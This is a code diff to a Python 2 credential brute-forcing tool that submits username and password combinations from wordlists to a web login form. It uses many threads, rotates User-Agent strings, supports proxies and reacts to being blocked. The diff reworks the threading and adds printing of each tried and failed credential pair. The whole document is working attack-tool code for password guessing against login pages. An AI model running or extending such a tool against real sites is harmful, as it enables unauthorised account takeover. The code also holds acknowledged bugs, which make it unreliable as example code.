@@ -52,6 +52,7 @@ def handle(optionURL, optionUserlist, optionPasslist, optionKeyFalse, optionThre
 	proc = tbrowser.startBrowser()
 	proc.addheaders = [('User-Agent', tbrowser.useragent())]
 
+
 	try:
 		utils.printf("Checking connection...")
 		proc.open(optionURL)
@@ -66,134 +67,29 @@ def handle(optionURL, optionUserlist, optionPasslist, optionKeyFalse, optionThre
 		proc.close()
 	
 	workers = []
-	count = 0
+
 	for passwd in optionPasslist:
 		for usr in optionUserlist:
-			if count < optionThreads: # BUG Missing *(threads + n) (user) for passwd
-				worker = threading.Thread(
-					target = brute,
-					args = (
-						optionURL, usr, passwd, sizeUserlist * sizePasslist,
-						optionProxy, optionKeyFalse, optionVerbose, optionLog,
-						loginInfo
-					)
-				)
-				workers.append(worker)
-				count += 1
-				# do stuff
-			else:
-				# for worker in workers:
-				# 	worker.daemon = True
-				# 	worker.start()
-				# for worker in workers:
-				# 	worker.join()
+
+			if len(workers) == optionThreads:
 				do_job(workers)
 				del workers[:]
-				count = 0
 
-		#count = i #BUG: count does not work for exception
-		
-		# for worker in workers:
-		# 	worker.daemon = True
-		# 	worker.start()
-			
-		# for worker in workers:
-		# 	worker.join()
-		
-		del workers[:] # https://stackoverflow.com/a/12970184
-		
-		# clean workers? `del workers[:]`
-				
-	# workers = []
-	# co = 0
-	# ##New testing method 
-	# for usrname in optionUserlist:
-	# 	workers = [] #BUG: will not append all passwd (likely)
-	# 
-	# 	# BUG: passwd [pos] <= co
-	# 	#for passwd in optionPasslist:
-	# 	for i in xrange(optionThreads): #BUG thread should start with new username instead of break and starting new task
-	# 		try:
-	# 			passwd = optionPasslist[co + i]
-	# 			worker = threading.Thread(
-	# 				target = brute,
-	# 				args = (optionURL, usrname, passwd, sizeUserlist * sizePasslist, optionProxy, optionKeyFalse, optionVerbose, optionLog, loginInfo)
-	# 			)
-	# 
-	# 			#worker.daemon = True
-	# 
-	# 			workers.append(worker)
-	# 			#worker.start()
-	# 			co += i # BUG: wrong step offset
-	# 
-	# 		except IndexError: #TODO recheck this condition. Good for threads > size of list
-	# 			co = 0
-	# 			break
-	# 
-	# 			# worker.daemon = True 
-	# 			# worker.start()
-	# 	for worker in workers:
-	# 		worker.daemon = True
-	# 		worker.start()
-	# 
-	# 	for worker in workers:
-	# 		worker.join()
-
-
-			# except IndexError: #TODO recheck this condition. Good for threads > size of list
-			# 	co = 0
-			# 	break
-				
-		# for worker in workers:
-		# 	worker.join()
-		# for worker in workers:
-		# 	#worker.daemon = True
-		# 	worker.start()
-	# 
-	# for worker in workers:
-	# 	worker.daemon = True 
-	# 	worker.start()
-	# count = 0
-	# while True:
-	# 	for i in xrange(optionThreads):
-	# 		try:
-	# 			worker = workers[count + i]
-	# 			worker.daemon = True
-	# 			worker.start()
-	# 			count += 1
-	# 		except IndexError:
-	# 			break
-	# 		worker.join()
+			worker = threading.Thread(
+				target = brute,
+				args = (
+					optionURL, usr, passwd, sizeUserlist * sizePasslist,
+					optionProxy, optionKeyFalse, optionVerbose, optionLog,
+					loginInfo
+				)
+			)
+			workers.append(worker)
 	
-
-	# for worker in workers:
-	# 	worker.join()
-	# end of testing
-
-	# old method
-	# try:
-	# 	for i in xrange(optionThreads):
-	# 		worker = threading.Thread(
-	# 			target = brute,
-	# 			args = (optionURL, optionUserlist, optionPasslist, sizePasslist, optionProxyList, optionKeyFalse, loginInfo)
-	# 		)
-	# 		workers.append(worker)
-	# 
-	# except Exception as err:
-	# 	utils.die("Error while creating threads", err)
-	# 
-	# try:
-	# 	for worker in workers:
-	# 		worker.daemon = True
-	# 		worker.start()
-	# 
-	# except Exception as err:
-	# 	utils.die("Error while running thread", err)
-	# 
-	# finally:
-	# 	for worker in workers:
-	# 		worker.join()
-	#brute(optionURL, optionUserlist, optionPasslist, sizePasslist, optionProxyList, optionKeyFalse, loginInfo)
+	#DO ALL LAST TASKs
+	for worker in workers:
+		do_job(workers)
+		del workers[:]
+		
 
 def brute(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFalse, optionVerbose, optionLog, loginInfo):
 	############################################
@@ -243,14 +139,16 @@ def brute(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFal
 		proc.form[frmUserfield] = tryUsername
 		proc.form[frmPassfield] = tryPassword
 
+		# BUG: idxTry is always 1
+		utils.printp(idxTry, sizeTask)
+
 		#	Send request
 		proc.submit()
 
 		#	Print status bar
-		utils.printp(tryUsername, idxTry, sizeTask)
 
 		if optionVerbose:
-			print "Verbose: %s:%s" %(tryUsername, tryPassword)
+			utils.printf("Trying: %s:%s" %(tryUsername, tryPassword), 'norm')
 
 		#	Reload - useful for redirect to dashboard
 		proc.reload()
@@ -270,11 +168,18 @@ def brute(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFal
 
 					#	Clear object and try new username
 					proc.close()
+				else:
+					if optionVerbose:
+						utils.printf("Failed: %s:%s" %(tryUsername, tryPassword), "bad")
+					
 			else:
 				utils.printSuccess(tryUsername, tryPassword)
 
 				#	Clear object and try new username
 				proc.close()
+		else:
+			if optionVerbose:
+				utils.printf("Failed: %s:%s" %(tryUsername, tryPassword), "bad")
 
 	except mechanize.HTTPError as error:
 		#	Get blocked
